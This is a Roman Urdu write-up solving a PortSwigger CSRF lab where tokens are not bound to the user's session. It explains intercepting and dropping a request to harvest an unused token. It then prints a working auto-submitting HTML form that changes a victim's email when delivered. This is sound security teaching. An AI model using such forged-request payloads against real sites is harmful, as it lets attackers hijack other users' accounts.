# 🔐 CSRF Lab: Token Not Tied to User Session

## 🧠 Lab Concept Overview

Is lab mein website CSRF token to use karti hai, lekin problem yeh hai ke **yeh token user ke session se linked nahi hota**. Matlab koi bhi token kisi bhi user pe apply ho jata hai — yeh major logic flaw hai.

---

## 📌 Real World Analogy:

Soch ke dekho ke har banda apna ID card kisi bhi doosre ke naam pe use kar sakta hai — aur system sirf card dekh ke kaam kar de, verify na kare ke banda wahi hai ke nahi.

---

## 🛠️ Step-by-Step Lab Solve

### ✅ Step 1: Login as `wiener:peter`

* Burp browser mein lab URL open karo
* Login karo: `wiener : peter`
* Go to "My Account"

---

### ✅ Step 2: Intercept Email Change Request

* Email change form bhar ke submit karo (e.g. `test123@a1.com`)
* Burp Proxy mein request intercept karo:

  ```
  POST /my-account/change-email
  email=test123@a1.com
  csrf=E4s1CPthNVpvcGv4lNKLODIX5BrVNbPQ
  ```
* **CSRF token copy karo** (e.g. `E4s1CPthNVpvcGv4lNKLODIX5BrVNbPQ`)
* Request ko **DROP kar do** (taake token use na ho)

---

### ✅ Step 3: Exploit HTML Prepare Karo

* Exploit server pe jao
* Body section mein yeh code paste karo:

```html
<form method="POST" action="https://0a4c003f04775ba980646ceb00580037.web-security-academy.net/my-account/change-email">
  <input type="hidden" name="email" value="asdas2@assa.com">
  <input type="hidden" name="csrf" value="E4s1CPthNVpvcGv4lNKLODIX5BrVNbPQ">
</form>
<script>
  document.forms[0].submit();
</script>
```

* ✅ Lab URL ka apna action link daalo
* ✅ Email koi **unique aur valid** likho
* ✅ CSRF token wahi wiener wali copy ki hui value rakho

---

### ✅ Step 4: Store & Deliver

* Click **Store** on exploit server
* Click **Deliver to Victim**
* ✅ **Lab Solved!**

```
Lab Solved krny ky liye jo zaroori cheez hai woh yeh hai ky csrf token use nhi hone chahie 
agr woh aik baar use hoo jaye phir woh dobara use nhi hota isi liye request ko drop kiya jaata hai takay woh use na hoo.
```
---

## 🔍 Kya Seekha?

* Agar CSRF token user session se link nahi hota to koi bhi valid token kisi aur user pe apply ho sakta hai
* Ye logic flaw hota hai aur real-world mein bhi milta hai
* Penetration testing mein aise flaws test karne hote hain

---

## 🧠 Zuban Mein Summary:

> "Server token check to karta hai lekin ye dekhne ka system hi nahi banaya ke yeh token isi user ka hai. Isi liye hum wiener se token le ke carlos ke session mein use kar lete hain. Yeh dangerous logic flaw hai."

